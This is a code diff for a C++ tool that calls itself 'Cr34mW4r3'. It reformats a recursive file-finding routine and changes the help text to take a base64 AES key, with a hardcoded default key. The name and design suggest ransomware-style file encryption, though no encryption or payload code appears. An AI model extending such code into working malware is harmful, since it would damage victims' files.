@@ -25,11 +25,13 @@ void FindFile(const std::wstring &directory, wstring ext, queue<wstring> &result
                     continue;
             }
 
+            // FIX: oss << '\"' << fullBatchFileName << '\"';
             tmp = directory + L"\\" + std::wstring(file.cFileName);
             wcout << tmp << endl;
-            if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && PathMatchSpecW(file.cFileName, ext.c_str())) {
+            if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
+              && PathMatchSpecW(file.cFileName, ext.c_str()))
                 results.push(tmp);
-            }
+           
 
             if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                 directories.push_back(tmp);
@@ -42,8 +44,6 @@ void FindFile(const std::wstring &directory, wstring ext, queue<wstring> &result
     }
 }
 
-
-
 int wmain(int argc, wchar_t* argv[])
 {
     auto printNice = [](const wchar_t* s) {
@@ -52,7 +52,9 @@ int wmain(int argc, wchar_t* argv[])
 
     const wchar_t* help =
         L"[*] This is  the Cr34mW4r3 manpage\n"
-        L"[+] usage: creamware <dirpath> <aeskey-16>";
+        L"[+] usage: creamware <dirpath> <b64(aeskey-16)>\n"
+        L"[+] if aeskey-16 is not specified the following key will be used:\n"
+        L"[*] aeskey: 3igcZhRdWq96m3GUmTAiv9\n";
 
 
     if (argc < 1) {
